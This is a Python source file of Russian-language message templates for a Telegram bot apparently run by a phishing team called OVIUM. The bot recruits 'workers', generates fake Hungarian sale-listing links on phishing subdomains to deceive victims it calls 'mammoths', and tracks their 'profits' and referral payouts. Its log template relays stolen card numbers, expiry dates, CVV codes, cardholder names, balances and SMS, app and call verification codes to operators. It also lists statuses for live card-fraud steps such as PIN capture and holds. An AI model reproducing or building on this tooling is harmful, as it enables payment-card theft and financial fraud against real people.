from core.utils import config

class texts():
    start="4234234"
    confirm_user = '''🎉Поздравляем, вы были приняты!

Используйте меню выше, что ознакомится с функционалом нашего бота, в случае, если меню пропадёт, просто пропишите /start.'''
    not_confirm_user = "Вы не приняты."
    menu = '''Жизнь коротка, и каждая минута на счету. Посвящая своё время нашему проекту сейчас, вы делаете вложение в будущее. Ваша отдача и усердие в нашем деле приведут к результатам, которые не только оправдают затраченное время, но и принесут плоды, экономя ваше время в долгосрочной перспективе!\n\n🕒График работы проекта: с 08:00 до 00:30 по МСК.'''
    channels = "Чем больше вы изучите, тем больше вы получите!"
    @staticmethod
    def profile(id, nickHide,SmartSupp,  sumProfits, countProfits, commandMe):
        SmartSupp_text = "🟢"
        if not SmartSupp:
            SmartSupp_text = "🔴"
        nickHide_text = "cкрыт"
        if not nickHide:
            nickHide_text = "открыт"
        text = '`Помните золотое правило успеха: стремление + упорный труд = финансовое вознаграждение и бесценный опыт!`'
        if commandMe:
            text=""
        return f'''👤 Ваш уникальный ID: `{id}`

🛡Ник: {nickHide_text}

🌑 SmartSupp: {SmartSupp_text}

🎩 Сумма профитов: ${sumProfits}
🏦 Количество профитов: {countProfits}

{text}'''


    @staticmethod
    def nickname(hide, nickname):
        hide_text = "скрыт" if hide else "открыт"

        # Проверка на None и экранирование спецсимволов
        nickname_text = nickname if nickname is not None else "Нет ника"
        nickname_text = nickname_text.replace("_", "\\_")  # Экранирование символа "_"
        return f'''🛡Ник: `{hide_text}`
🛡Ваш ник: {nickname_text}'''
    @staticmethod
    def nickname_edit(hide, nickname):
        return texts.nickname(hide, nickname)+"\n\n🔥Укажите новую маску которую хотите использовать(До 10 символов):"

    @staticmethod
    def confirm_nickname(nickname):
        return f"Поздравляем вы успешно сменили свою маску на {nickname}!"

    error_nickname = f'''Произошла ошибка при смене маски 
возможные проблемы: 
1. Маска уже используется
2. Текст вашей маски свыше 10 символов'''

    tools = "✅Все инструменты в одном месте👇"

    referrals = '''🤝Примечание для тебя: мы платим со своего кармана 3%, но исключительно на первый профит воркера. С второго профита своего друга, воркер который его пригласил уже ничего не получит.

📊Список ваших друзей (0):'''
    @staticmethod
    def smartsupp(key):
        return f'''Ключ Smartsupp: {key}'''

    new_smartsupp = "Укажите новый ключ для Smartsupp"
    error_smartsupp = "❌Ошибка при изменении ключа"
    @staticmethod
    def confirm_smartsupp(key):
        return  f"Вы успешно поменяли ключ Smartsupp на {key}"
    select_service = "Выберите сервис:"

    none_active_countries = "Нет активных стран"
    none_active_services = "Нет активных сервисов"
    create_link_caption ="Наша команда неустанно трудятся, чтобы укрепить доверие мамонта к вам постоянно совершенствуя наши фишинги. Мы проводим множество бессонных ночей, постоянно обдумывая, как улучшить наш продукт, чтобы вы могли видеть конкретные результаты своей работы в виде увеличения профитов!"
    link_name = "Введите название объявления"
    link_description = "Укажите описание товара."
    link_price = "Введите цену объявления (только число, в HUF)"
    link_author = "Введите имя покупателя/продавца (Формат: Имя Фамилия)"
    link_address = "Введите адрес покупателя"
    link_checker = "Чекер баланса"
    link_photo = "Отправьте фото"
    link_number = "Телефон"
    @staticmethod
    def link(link, settings, service):
        print(settings)
        print('---------------')
        print(service)
        return f'''Обьявление {link['country']['flag'] + link['name']}

💬Название: {link['name']}
💰Цена: {link['price']}
📰Имя: {link['author']}
📱Телефон: {"отсутствует" if link['number'] == "" else link['number']}
🏡Адрес: {"отсутствует" if link['address'] == "" else link['address']}
💸Чекер баланса: {"включен" if link['checker'] else "выключен"}

🔗Получение оплаты: {f"{service['subdomain']}.{str(settings[0]['domain'])}/{link['country']['code']}/{str(link['id'])}"}'''
    change_price_link = "Введите новую цену"
    change_price_link_error = "❌Ошибка при изменении баланса"
    @staticmethod
    def change_price_link_success(price):
        return f"✅Вы успешно изменили баланс на {price}"

    @staticmethod
    def delete_link(link):
        return f"Вы действительно хотите удалить обьявление {link}?"

    @staticmethod
    def delete_link_confirm(link):
        return f"✅Вы удалили обьявление {link}"

    @staticmethod
    def links(count):
        return f'''Количество объявлений: {count}
Объявления удаляются 1 раз в 24 часа с момента создания!'''

    admin_error = "У вас нет доступа к админ панели."

    @staticmethod
    def admin_menu(data):
        return f'''🔐 Панель администратора

👥 Пользователей: {data['users']}
📦 Сервисов: {data['services']}
💰 Профитов: {data['profits']}
🗃 Объявлений: {data['links']}
📰 Заявок: {data['requests']}
⏳ Заявок на рассмотрении: {data['requests_wait']}
✅ Принятых заявок: {data['requests_accepted']}
❌ Отклонённых заявок: {data['request_error']}

💸 Сумма невыплаченных профитов: {data['sum_non_paid']} USD
💳 Сумма выплаченных профитов: {data['sum_paid']} USD

💴 Процент воркера с залёта: {data['percent']}%'''


    stop_work = "🩸STOP WORK"

    none_links_user = "У данного пользователя нет обьявлений!"

    choose_country = "🌎 Выберите страну"

class in_keyboard_texts:
    inlineStart = "⚡️ПЕРЕЙТИ К ЗАЯВКЕ⚡️"
    confirmRules = "Я принимаю"
    identificationButton1 = "Реклама"
    identificationButton2 = "Друзья"
    createLink = "🔗Создать ссылку🔗"
    profile = "💾Профиль💾"
    channels = "📋Чаты/Каналы📋"
    tools = "⚙️Инструменты⚙️"
    backIdentification = "Вернуться обратно, я ошибся."
    hideNickname = "🎭Скрыть ник🎭"
    menu = "<< Главное меню"
    tools = "🛠Инструменты🛠"
    all_chat_text_link = "LITE CHAT"
    profits_text_link = "Профиты"
    manuals_text_link = "Мануалы/Инфо"
    how_work_text_link = "🔥КАК РАБОТАТЬ?🔥"
    onOffnickname = "♻️Включить/Выключить♻️"
    changeNickname = "✏️Изменить ник✏️"
    mask = "🛡Маска🛡"
    mentors = "👨‍🏫Наставники👨‍🏫"
    referals = "🤝Доп.заработок🤝"
    smartsupp = "💬SmartSupp💬"
    new_smartsupp = "🗯Указать новый ключ SmartSupp🗯"
    ad = "🗂Мои обьявления🗂"
    cancel ="Отмена"
    checker_create_link_off = "Выключить"
    checker_create_link_on = "Включить"
    skip = "Пропустить"
    link_check_on = "🟢Включить чекер баланса"
    link_check_off = "🔴Выключить чекер баланса"
    link_change_price = "💰Изменить цену"
    link_delete = "❌Удалить обьявление"
    back = "◀️Назад"
    delete_link_confirm = "Да"
    admin_panel = "🔒АДМИН ПАНЕЛЬ🔒"
    admin_stop_work = "🩸STOP WORK"
    admin_send_all = "📨Отправить рассылку"
    admin_users = "🤼Пользователи"
    admin_services = "📦Сервисы"
    admin_profits = "💰Профиты"
    admin_requests = "📃Заявки"
    admin_settings = "⚙️Настройки"
    admin_countries = "🗺Страны"
    @staticmethod
    def admin_make_mentor(mentor):
        return "Назначить наставником" if not mentor else "Убрать с наставников"

    admin_user_block = "🔴Заблокировать"
    admin_change_status = "🚦Изменить статус"
    admin_user_request = "📰Заявка"
    admin_links = "📦Обьявления"

    @staticmethod
    def country_active(active):
        return "👁Выключить" if active else "🕶Включить"

    @staticmethod
    def country(flag, name):
        return flag+name+flag

    @staticmethod
    def servicesCountry(flag, name):
        return flag+name


    @staticmethod
    def AdminServicesCountry(flag, name, active):
        activeText = " 🟢" if active else " 🔴"
        return flag + name + activeText

class start_texts:
    start = "🚀OVIUM — Мы обещаем обеспечить финансовую свободу всем, кто разделяет наши ценности и верно следует за нами!"

    rules = "✅ Чтобы иметь возможность на повышенный % к выплатам, добавьте в ник аббревиатуру 'OVIUM' в своё имя пользователя\. Мы особо ценим усилия таких воркеров и поощряем их более высокими процентами\.\n\n🗒[Сводка правил проекта](http://your_rules_summary_url)"

    errorUsername = '''🚧 Для использования бота установите имя пользователя
☁️ Пример: @OVIUM'''
    identification = "Откуда узнали про нас?"
    waitText = "Ожидайте, пока вашу заявку примут. Обычно это занимает от 15 секунд до 1 часа."
    friendWaitText = "Введите юзернейм вашего друга, который вас пригласил. Он получит 6% с вашего первого профита.\n\nПример: @OviumBot"

class admin_texts:
    @staticmethod
    def admin_user_profile(user):
        print(user)
        return f'''
    👤 Пользователь: @{user['username']}

🆔 ID: {user['id']}

💰 Профитов: {user['profits_count']}
💸 Сумма профитов: {user['profits_count']} USD.
📦 Объявлений: {user['links_count']}
🚦 Статус: {user['status']}
📃 Присоединился: {user['added']}
Наставник: {"Да" if user['mentor'] else "Нет"}

📰 Заявка: 
— ID: {user['request_id']}
— Статус: {user['request_status']}'''
    @staticmethod
    def stop_work_text(count):
        return f"✅Текст отправлен {count} пользователям"

    admin_send_all = "Введите сообщение для рассылки:"

    @staticmethod
    def admin_users(count):
        return f"👥 Список пользователей (Всего: {count})"
    @staticmethod
    def new_user_text(username, identification, friend = None):
        friend_text = ""
        if friend is not None:
            friend_text = f"Друг: {friend}"
        return f"Пришла новая заявка на вступление!\n\ntg: @{username}\nОткуда узнал: {identification}\n{friend_text}"

    add_new_user = "Принять"
    ban_new_user  = "Отклонить"

    @staticmethod
    def request(request):
        friend_text = ""
        print(request)
        if request['type'] == "Друг":
            friend_text = f"Друг: {request['textType']}"
        return f"Заявка #{request['id']}\nСтатус:{request['status']}\ntg: @{request['username']}\nОткуда узнал: {request['type']}\n{friend_text}"

    @staticmethod
    def confirmed_user(username, admin_username):
        return f"@{admin_username} успешно принял заявку от @{username}"

    error_confirm_user = "Произошла ошибка при одобрении заявки."

    @staticmethod
    def not_confirmed_user(username, admin_username):
        return f"@{admin_username} отклонил заявку от @{username}"

    none_profits = "Профитов нет"


    statusTS = "ТС💢"
    statusDeveloper = "Разработчик👾"
    statusAdmin = "Администратор👑"
    statusVbiver = "Вбивер✍️"
    statusWorker = "Воркер🛠"

    @staticmethod
    def status(_status):
        statusText = {
            "ts":"ТС💢",
            "developer":"Разработчик👾",
            "admin":"Администратор👑",
            "vbiver":"Вбивер✍️",
            "worker":"Воркер🛠"
        }
        return statusText[_status]

    @staticmethod
    def requests(count):
        return f'''📝 Список заявок (Всего: {count})'''

    select_service = "Выберите сервис"
    @staticmethod
    def service(service, count, domain):
        print(service)
        return f'''📦 Сервис: {service['orig_domain']}

🌎 Страна:{service['country']}
🎟 Объявлений: {count}
🔧Активный домен:{service['subdomain']}.{domain}'''
    @staticmethod
    def profits(user = None):
        if user:
            return f"Профиты от @{user}"
        return "Профиты"
    change_subdomain = "📝 Изменить поддомен"
    enter_subdomain = "Введите поддомен"
    error_change_subdomain = "❌Произошла ошибка при изменении поддомена"
    @staticmethod
    def success_change_subdomain(domain):
        return f"✅Вы успешно поменяли поддомен на {domain}"
    @staticmethod
    def hide_service(active):
        return "👁 Скрыть сервис" if active else "😎Показать сервис"

    enter_percent = "Введите процент воркера за залёт"
    change_percent = "🤑Изменить процент воркера"
    change_all_domain = "🏠Изменить домен"
    enter_domain = "Введите домен"
    error_change_domain = "❌Произошла ошибка при изменении домена"

    @staticmethod
    def success_change_percent(percent):
        return f"✅Вы успешно поменяли процент всех воркеров на {percent}"

    error_change_percent = "❌Произошла ошибка при изменении процента"
    @staticmethod
    def success_change_domain(domain):
        return  f"✅Вы успешно поменяли домен всех сервисов на {domain}"
    @staticmethod
    def settings(settings):

        return f'''⚙️ Настройки бота
    
📰 ID группы для логирования действий: {config.ADMIN_LOGGING_ID}
👥 ID общей группы: {config.ALL_CHAT_ID}
🧾 ID группы для заявок: {config.ADMIN_REQUESTS_ID}
💰 ID канала для выплат: {config.ADMIN_WITHDRAW_ID}
💬 Ссылка на общий чат: {config.url_all_chat}
💸 Ссылка на канал выплат: {config.url_withdraw_channel}
💴 Процент воркера за залёт: {str(settings['percent_worker'])}%'''
class log:

    @staticmethod
    def log_text(service, link, worker, log):
        balance = f"\n💰 Balance: {log['balance']} Ft" if log['balance'] else ""
        accurate = f"\nAccurate Balance: {log['accurate_balance']}" if log['accurate_balance'] else ""
        sms = f"\n📴 SMS Code: {log['sms']}" if log['sms'] else ""
        app_code = f"\nApp Code: {log['app_code']}" if log['app_code'] else ""
        call_code = f"\nCall Code: {log['call_code']}" if log['call_code'] else ""
        return f'''{service['country']+service['name']}!

💳 Card Number: {log['card']}
📅 Card Expiry Date: {log['expire']}
🤣 Cardholder Name: {log['holder']}
🔢 CVV Code: {log['cvc']}{balance}{accurate}{sms}{app_code}{call_code}Answer to Question: dfghdfhgfh

👨🏻‍💻 Воркер: {worker['nickname']}
👤 ID Воркера: {worker['id']}

🔡 Объявление: {link['name']}
🔢 ID Объявления: {link['id']}  

💲 Цена:{link['price']} HUF
👁 #search193022231'''


    wait_text ="Напишите текст:"

    user_online = "🟢Пользователь в сети"
    user_offline = "🔴Пользователь не в сети"

    success = "💵Успех"
    @staticmethod
    def vbiver(nickname):
        return f"🧑‍💻Вбивает: {nickname}"

    online = "🚘Онлайн мамонта"

    custom_error = "❗️Кастомная ошибка"
    custom_text = "❗️Кастомный текст"
    push = "📱PUSH"
    lk = "🏦ЛК"
    error_hold = "❌Неуспешный холд"
    error_code = "❌Неверный код"
    error_push = "❌Неподтвержденный ПУШ"
    decline = "❌Отказаться"
    accurate = "❔ТОЧНЫЙ"
    image = "📷Картинка"
    pin_code = "🔐ПИН-КОД"
    sms = "📩SMS"
    change = "💳СМЕНА"
    deposit = "💸ДЕП"
    limits = "⚠️ЛИМИТЫ"
    success_hold = "✅Успешный холд"
    app_code = "📫КОД С ПРИЛОЖЕНИЯ"
    call_code = "📞КОД ИЗ ЗВОНКА"
    @staticmethod
    def status(status):
        statusText = {
            "hold":"🔒ХОЛД",
            "wait":"⏳ОЖИДАНИЕ",
            "index":"⏳ОЖИДАНИЕ",
            "push":"📱PUSH",
            "lk":"🏦ЛК",
            "error_hold":"❌Неуспешный холд",
            "error_code":"❌Неверный код",
            "error_push":"❌Неподтвержденный ПУШ",
            "decline":"❌Отказаться",
            "accurate":"❔ТОЧНЫЙ",
            "image":"📷Картинка",
            "pin_code":"🔐ПИН-КОД",
            "sms":"📩SMS",
            "change":"💳СМЕНА",
            "deposit":"💸ДЕП",
            "limit":"⚠️ЛИМИТЫ",
            "success_hold":"✅Успешный холд",
            "app_code":"📫КОД С ПРИЛОЖЕНИЯ",
            "call_code":"📞КОД ИЗ ЗВОНКА"
        }
        return "Статус: "+statusText[status]